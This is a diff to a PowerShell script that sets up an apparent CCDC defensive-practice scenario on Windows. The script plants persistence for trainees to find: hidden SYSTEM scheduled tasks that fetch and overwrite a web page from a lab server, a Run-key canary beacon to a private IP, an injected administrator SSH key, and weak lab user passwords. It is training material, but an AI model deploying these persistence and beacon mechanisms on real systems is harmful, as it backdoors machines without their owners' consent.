@@ -11,6 +11,7 @@ param(
     [string]$RootKeyBlob,
     [string]$LabServer,
     [string]$CanaryUrl,
+    [string]$LabPassword,
     [string]$XamppDir,
     [string]$WebRoot
 )
@@ -20,16 +21,16 @@ $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
 
 # Redhavi: escenario de practica CCDC para Windows 10/11 y Windows Server.
-$script:ScenarioVersion = 5
+$script:ScenarioVersion = 7
 $script:ExpectedChecks = 11
 $script:TaskName = "Redhavi-IndexRefresh"
 $script:CanaryTaskName = "Redhavi-CanaryCheckin"
 $script:CanaryIntervalMinutes = 3
 $script:RunKeyPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 $script:RunValueName = "RedhaviIndexRefresh"
-$script:ApacheServiceName = "RedhaviApache"
 $script:StateDir = Join-Path $env:ProgramData "redhavi"
 $script:StateFile = Join-Path $script:StateDir "state-win.json"
+$script:RefreshScript = Join-Path $script:StateDir "redhavi-index-refresh.ps1"
 $script:CanaryScript = Join-Path $script:StateDir "redhavi-registry-canary.ps1"
 $script:KeyReference = Join-Path $script:StateDir "administrator-key.pub"
 $script:AuthorizedKeys = Join-Path $env:ProgramData "ssh\administrators_authorized_keys"
@@ -62,7 +63,8 @@ $script:RootKeyUrl = Get-Setting $RootKeyUrl "REDHAVI_ROOT_KEY_URL" "https://raw
 $script:RootKeyBlob = Get-Setting $RootKeyBlob "REDHAVI_ROOT_KEY_BLOB" "AAAAC3NzaC1lZDI1NTE5AAAAILvd2Ok5Jk5HN1XFacHqgh+c2PhAr26Z8FZ130iaVDUB"
 $script:LabServer = Get-Setting $LabServer "REDHAVI_LAB_SERVER" "10.5.8.11"
 $script:RefreshUrl = "http://$($script:LabServer)/index.php"
-$script:CanaryUrl = Get-Setting $CanaryUrl "REDHAVI_CANARY_URL" "http://172.16.101.77:8081/redhavi-checkin"
+$script:CanaryUrl = Get-Setting $CanaryUrl "REDHAVI_CANARY_URL" "http://172.16.101.77:8081/checkin"
+$script:LabPassword = Get-Setting $LabPassword "REDHAVI_LAB_PASSWORD" "!Password123"
 $script:XamppDir = Get-Setting $XamppDir "REDHAVI_XAMPP_DIR" "C:\xampp"
 $script:WebRootWasSpecified = -not [string]::IsNullOrWhiteSpace($WebRoot) -or -not [string]::IsNullOrWhiteSpace($env:REDHAVI_WEB_ROOT)
 $script:WebRoot = Get-Setting $WebRoot "REDHAVI_WEB_ROOT" (Join-Path $script:XamppDir "htdocs\simple-php-website")
@@ -110,13 +112,13 @@ function Write-State {
         root_key_blob    = $script:RootKeyBlob
         task_name        = $script:TaskName
         refresh_url      = $script:RefreshUrl
+        refresh_script   = $script:RefreshScript
         canary_task_name = $script:CanaryTaskName
         canary_interval  = $script:CanaryIntervalMinutes
         run_key_path     = $script:RunKeyPath
         run_value_name   = $script:RunValueName
         canary_url       = $script:CanaryUrl
         canary_script    = $script:CanaryScript
-        apache_service   = $script:ApacheServiceName
     }
 
     $state | ConvertTo-Json | Set-Content -LiteralPath $temporaryState -Encoding UTF8
@@ -337,23 +339,51 @@ function Setup-WebContent {
     }
 }
 
-function Get-RefreshCommand {
+function Write-RefreshScript {
     $escapedUrl = $script:RefreshUrl.Replace("'", "''")
     $escapedPath = $script:IndexPath.Replace("'", "''")
-    return "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"try { Invoke-WebRequest -UseBasicParsing -Uri '$escapedUrl' -OutFile '$escapedPath' } catch { }`""
+    $content = @(
+        '$ErrorActionPreference = "SilentlyContinue"',
+        "Invoke-WebRequest -UseBasicParsing -Uri '$escapedUrl' -OutFile '$escapedPath'"
+    )
+    $content | Set-Content -LiteralPath $script:RefreshScript -Encoding UTF8
+}
+
+function Register-PeriodicSystemTask {
+    param(
+        [Parameter(Mandatory)][string]$Name,
+        [Parameter(Mandatory)][string]$ScriptPath,
+        [Parameter(Mandatory)][ValidateRange(1, 1440)][int]$IntervalMinutes
+    )
+
+    $powerShellExe = Join-Path $env:SystemRoot "System32\WindowsPowerShell\v1.0\powershell.exe"
+    $arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+    $action = New-ScheduledTaskAction -Execute $powerShellExe -Argument $arguments
+    $trigger = New-ScheduledTaskTrigger `
+        -Once `
+        -At (Get-Date).AddMinutes(1) `
+        -RepetitionInterval ([TimeSpan]::FromMinutes($IntervalMinutes)) `
+        -RepetitionDuration ([TimeSpan]::FromDays(3650))
+    $principal = New-ScheduledTaskPrincipal `
+        -UserId "SYSTEM" `
+        -LogonType ServiceAccount `
+        -RunLevel Highest
+
+    Register-ScheduledTask `
+        -TaskName $Name `
+        -Action $action `
+        -Trigger $trigger `
+        -Principal $principal `
+        -Force | Out-Null
 }
 
 function Setup-RefreshTask {
     Write-Log "Creando la tarea programada de persistencia..."
-    $taskCommand = Get-RefreshCommand
-
-    Invoke-Native -FilePath "schtasks.exe" -Arguments @(
-        "/Create", "/TN", $script:TaskName,
-        "/SC", "MINUTE", "/MO", "1",
-        "/RU", "SYSTEM", "/RL", "HIGHEST",
-        "/TR", $taskCommand,
-        "/F"
-    )
+    Write-RefreshScript
+    Register-PeriodicSystemTask `
+        -Name $script:TaskName `
+        -ScriptPath $script:RefreshScript `
+        -IntervalMinutes 1
 }
 
 function Setup-RegistryPersistence {
@@ -361,10 +391,7 @@ function Setup-RegistryPersistence {
     $escapedCanaryUrl = $script:CanaryUrl.Replace("'", "''")
     $canaryContent = @(
         '$ErrorActionPreference = "SilentlyContinue"',
-        "`$baseUrl = '$escapedCanaryUrl'",
-        '$separator = if ($baseUrl.Contains("?")) { "&" } else { "?" }',
-        '$uri = $baseUrl + $separator + "host=" + [Uri]::EscapeDataString($env:COMPUTERNAME) + "&user=" + [Uri]::EscapeDataString($env:USERNAME)',
-        'Invoke-WebRequest -UseBasicParsing -Uri $uri | Out-Null'
+        "Invoke-RestMethod -Uri '$escapedCanaryUrl' | Out-Null"
     )
     $canaryContent | Set-Content -LiteralPath $script:CanaryScript -Encoding UTF8
 
@@ -383,14 +410,10 @@ function Setup-RegistryPersistence {
 
 function Setup-PeriodicCanaryTask {
     Write-Log "Creando la llamada periodica al canary cada $($script:CanaryIntervalMinutes) minutos..."
-    $command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($script:CanaryScript)`""
-    Invoke-Native -FilePath "schtasks.exe" -Arguments @(
-        "/Create", "/TN", $script:CanaryTaskName,
-        "/SC", "MINUTE", "/MO", [string]$script:CanaryIntervalMinutes,
-        "/RU", "SYSTEM", "/RL", "HIGHEST",
-        "/TR", $command,
-        "/F"
-    )
+    Register-PeriodicSystemTask `
+        -Name $script:CanaryTaskName `
+        -ScriptPath $script:CanaryScript `
+        -IntervalMinutes $script:CanaryIntervalMinutes
 }
 
 function Get-AdministratorsGroup {
@@ -437,8 +460,8 @@ function Ensure-LabUser {
 
 function Setup-LabUsers {
     Write-Log "Configurando usuarios locales de practica..."
-    Ensure-LabUser -Name "ccdc" -Password "ccdc" -MustChangePassword
-    Ensure-LabUser -Name "splunk" -Password "ass"
+    Ensure-LabUser -Name "ccdc" -Password $script:LabPassword -MustChangePassword
+    Ensure-LabUser -Name "splunk" -Password $script:LabPassword
 }
 
 function Get-KeyBlobFromLine {
@@ -537,21 +560,6 @@ function Test-FeatureEnabled {
     return (Get-WindowsOptionalFeature -Online -FeatureName $Name).State -eq "Enabled"
 }
 
-function Setup-ApacheService {
-    Write-Log "Instalando e iniciando Apache de XAMPP como servicio..."
-    $httpd = Join-Path $script:XamppDir "apache\bin\httpd.exe"
-    $serverRoot = Join-Path $script:XamppDir "apache"
-    $service = Get-Service -Name $script:ApacheServiceName -ErrorAction SilentlyContinue
-    if (-not $service) {
-        Invoke-Native -FilePath $httpd -Arguments @(
-            "-k", "install", "-n", $script:ApacheServiceName,
-            "-d", $serverRoot, "-f", "conf\httpd.conf"
-        )
-    }
-    Set-Service -Name $script:ApacheServiceName -StartupType Automatic
-    Start-Service -Name $script:ApacheServiceName
-}
-
 function Test-LabUserSeeded {
     param([Parameter(Mandatory)][string]$Name)
 
@@ -570,7 +578,14 @@ function Test-RefreshTaskSeeded {
         return $false
     }
     $actionText = ($task.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join " "
-    return $actionText.Contains($script:RefreshUrl) -and $actionText.Contains($script:IndexPath)
+    if (-not $actionText.Contains($script:RefreshScript)) {
+        return $false
+    }
+    if (-not (Test-Path -LiteralPath $script:RefreshScript -PathType Leaf)) {
+        return $false
+    }
+    $refreshContent = Get-Content -LiteralPath $script:RefreshScript -Raw -ErrorAction Stop
+    return $refreshContent.Contains($script:RefreshUrl) -and $refreshContent.Contains($script:IndexPath)
 }
 
 function Test-RegistryPersistenceSeeded {
@@ -590,8 +605,7 @@ function Test-RegistryPersistenceSeeded {
     return (
         $value.Contains($script:CanaryScript) -and
         $canaryContent.Contains($script:CanaryUrl) -and
-        $canaryContent.Contains('$env:COMPUTERNAME') -and
-        $canaryContent.Contains('$env:USERNAME')
+        $canaryContent.Contains('Invoke-RestMethod')
     )
 }
 
@@ -621,8 +635,7 @@ function Invoke-PostValidation {
         @{ Label = "authorized_keys bloqueado"; Test = { Test-LabFileLocked $script:AuthorizedKeys } },
         @{ Label = "OpenSSH Server activo"; Test = { (Get-Service -Name "sshd").Status -eq "Running" } },
         @{ Label = "Telnet habilitado"; Test = { Test-FeatureEnabled "TelnetClient" } },
-        @{ Label = "TFTP habilitado"; Test = { Test-FeatureEnabled "TFTP" } },
-        @{ Label = "Apache activo"; Test = { (Get-Service -Name $script:ApacheServiceName).Status -eq "Running" } }
+        @{ Label = "TFTP habilitado"; Test = { Test-FeatureEnabled "TFTP" } }
     )
 
     foreach ($check in $checks) {
@@ -683,9 +696,6 @@ function Invoke-Redhavi {
 
     $script:CurrentStep = "caracteristicas inseguras"
     Enable-InsecureFeatures
-
-    $script:CurrentStep = "servicio Apache"
-    Setup-ApacheService
 
     $script:CurrentStep = "postvalidacion"
     if (-not (Invoke-PostValidation)) {
